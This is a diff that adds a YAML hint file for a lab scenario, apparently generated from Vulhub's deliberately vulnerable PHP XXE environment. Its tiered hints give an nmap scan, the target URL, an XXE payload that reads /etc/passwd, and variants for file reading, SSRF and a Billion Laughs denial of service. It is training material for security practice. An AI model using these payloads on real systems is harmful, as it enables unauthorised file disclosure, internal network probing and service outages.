@@ -1,0 +1,64 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: php/php_xxe
+hint_levels:
+  low:
+  - Inspect the php service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/index.php`.'
+  high:
+  - 'Vulnerability: PHP XML External Entity Injection (XXE).'
+  - "Vulnerability Reproduction\n\nSend the following XML payload to any of the vulnerable files to read the contents\
+    \ of `/etc/passwd`:\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?> \n<!DOCTYPE xxe [\n<!ELEMENT name\
+    \ ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<root>\n<name>&xxe;</name>\n</root>\n```\n\nThe successful\
+    \ exploitation will display the contents of the file:\n\nDocumentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/php_xxe/1.png\n\
+    \n### Advanced Exploitation Techniques\n\nReading Arbitrary Files:\n\n```xml\n<!ENTITY xxe SYSTEM \"file:///path/to/sensitive/file\"\
+    \ >\n```\n\nSSRF (Server-Side Request Forgery):\n\n```xml\n<!ENTITY xxe SYSTEM \"http://internal.service.local\"\
+    \ >\n```\n\nDenial of Service (Billion Laughs Attack):\n\n```xml\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;\"\
+    >\n<!ENTITY lol3 \"&lol2;&lol2;\">\n```"
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/php_xxe/README.md'
+  - |-
+    Additional public references:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE
+    - https://www.php.net/manual/en/book.libxml.php
+    - https://cwe.mitre.org/data/definitions/611.html
+access_instructions:
+  title: PHP XML External Entity Injection (XXE)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/index.php`.
+  - title: Vulnerability Reproduction
+    instructions: "Send the following XML payload to any of the vulnerable files to read the contents of `/etc/passwd`:\n\
+      \n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?> \n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe\
+      \ SYSTEM \"file:///etc/passwd\" >]>\n<root>\n<name>&xxe;</name>\n</root>\n```\n\nThe successful exploitation\
+      \ will display the contents of the file:\n\nDocumentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/php_xxe/1.png\n\
+      \n### Advanced Exploitation Techniques\n\nReading Arbitrary Files:\n\n```xml\n<!ENTITY xxe SYSTEM \"file:///path/to/sensitive/file\"\
+      \ >\n```\n\nSSRF (Server-Side Request Forgery):\n\n```xml\n<!ENTITY xxe SYSTEM \"http://internal.service.local\"\
+      \ >\n```\n\nDenial of Service (Billion Laughs Attack):\n\n```xml\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"\
+      &lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;\">\n```"
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/php_xxe/README.md
+  readme_sha256: 79562850cc2987e69c02acb59ae7ab13e3e203ea75bf92894e1a12657caeb1c9
+  compose_sha256: 321f9e7611835af3dfbb07e55e2d4c0be244e4b6bf5024c0be12e20afc84bcae
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
